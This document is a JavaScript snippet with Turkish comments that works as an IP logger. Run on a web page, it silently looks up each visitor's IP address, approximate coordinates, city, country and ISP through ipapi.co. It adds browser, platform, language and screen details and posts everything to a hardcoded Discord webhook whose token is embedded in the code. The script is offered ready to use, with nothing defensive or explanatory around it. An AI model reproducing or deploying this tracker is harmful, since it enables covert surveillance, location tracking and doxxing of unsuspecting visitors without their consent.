var ip = '';
var latitude = '';
var longitude = '';
var city = '';
var country = '';
var org = '';
var mapLink = '';
var browserInfo = navigator.userAgent;
var dateVisited = new Date().toUTCString();
var language = navigator.language;
var platform = navigator.platform;

fetch('https://ipapi.co/json/')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;
    latitude = data.latitude;
    longitude = data.longitude;
    city = data.city;
    country = data.country_name;
    org = data.org; // 'org' bilgisini alın

    mapLink = 'https://www.google.com/maps?q=' + latitude + ',' + longitude;

    var yerelZaman = new Date();
    var ekranGenislik = window.screen.width;
    var ekranYukseklik = window.screen.height;

    var message = 'IP: **' + ip + '**\nLatitude: ' + latitude + '\nLongitude: ' + longitude + '\nCity: ' + city + '\nCountry: ' + country + '\nOrganization: ' + org + '\nMap Link: ' + mapLink + '\n\nBrowser Info: ' + browserInfo + '\nDate Visited: ' + dateVisited + ' **(' + platform + ')**\nLanguage: ' + language + '\nZaman: ' + yerelZaman + '\nEkran Genişliği: ' + ekranGenislik + '*' + ekranYukseklik;

    var webhookURL = 'https://discord.com/api/webhooks/1125334024328597514/9RPHIBPRqXQrbzDOTRMNtjGe0u6SGNHjwD8JoXAcU6Q6u1itE1c7-1g5ive4wh_WUZZR'; // Discord webhook URL'sini buraya yapıştırın

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: message
      })
    })
    .then(function(response) {
      if (response.ok) {
        console.log('Veriler Discord API\'ye başarıyla gönderildi.');
      } else {
        console.error('Veriler Discord API\'ye gönderilemedi.');
      }
    })
    .catch(function(error) {
      console.error('Hata:', error);
    });
  })
  .catch(function(error) {
    console.error('Hata:', error);
  });
